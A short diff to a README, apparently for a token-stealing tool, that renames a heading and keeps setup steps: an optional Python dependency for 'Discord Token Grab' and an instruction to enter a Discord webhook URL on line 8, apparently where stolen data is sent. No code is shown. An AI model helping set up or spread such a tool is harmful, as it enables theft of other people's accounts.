@@ -15,7 +15,7 @@
 > (Optionnal) Python 3, if you want Discord Token Grab
 
 
-### Before Usage
+### Configuration
 - Create a Discord WebHook [help](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
 - Adapt line ``8`` and enter your WebHook URL.
 
